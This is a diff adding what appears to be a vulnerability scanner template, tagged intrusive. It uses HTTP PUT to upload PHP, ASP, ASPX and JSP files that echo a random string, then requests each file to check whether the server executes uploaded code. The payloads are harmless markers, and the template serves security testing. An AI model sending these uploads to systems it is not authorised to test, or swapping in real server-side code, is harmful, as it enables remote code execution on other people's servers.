@@ -1,0 +1,105 @@
+id: file-upload-methods-check
+info:
+  name: File Upload Methods Check
+  author: ChiragArtani
+  severity: high
+  description: Tests PUT method file upload capabilities for different web technologies (.php, .asp, .aspx, .jsp) by attempting to upload echo statements and verifying responses
+  reference:
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Upload_of_Malicious_Files
+  metadata:
+    max-request: 8
+  tags: upload,fileupload,intrusive
+
+http:
+  - raw:
+      # PHP Test
+      - |
+        PUT /test-upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-httpd-php
+        Content-Length: {{length_1}}
+
+        <?php echo "{{randstr}}"; ?>
+      - |
+        GET /test-upload.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # ASP Test
+      - |
+        PUT /test-upload.asp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-asp
+        Content-Length: {{length_2}}
+
+        <% Response.Write("{{randstr}}") %>
+      - |
+        GET /test-upload.asp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # ASPX Test
+      - |
+        PUT /test-upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-aspx
+        Content-Length: {{length_3}}
+
+        <%@ Page Language="C#" %>
+        <% Response.Write("{{randstr}}"); %>
+      - |
+        GET /test-upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+      # JSP Test
+      - |
+        PUT /test-upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-jsp
+        Content-Length: {{length_4}}
+
+        <%= "{{randstr}}" %>
+      - |
+        GET /test-upload.jsp HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: php-upload
+        regex:
+          - '{{randstr}}'
+        part: body_2
+
+      - type: regex
+        name: asp-upload
+        regex:
+          - '{{randstr}}'
+        part: body_4
+
+      - type: regex
+        name: aspx-upload
+        regex:
+          - '{{randstr}}'
+        part: body_6
+
+      - type: regex
+        name: jsp-upload
+        regex:
+          - '{{randstr}}'
+        part: body_8
+
+    extractors:
+      - type: regex
+        name: upload-response
+        regex:
+          - '(?m)^HTTP.*$'
+        part: response
+
+variables:
+  length_1: "{{len('<?php echo \"{{randstr}}\"; ?>')}}"
+  length_2: "{{len('<% Response.Write(\"{{randstr}}\") %>')}}"
+  length_3: "{{len('<%@ Page Language=\"C#\" %>\n<% Response.Write(\"{{randstr}}\"); %>')}}"
+  length_4: "{{len('<%= \"{{randstr}}\" %>')}}"
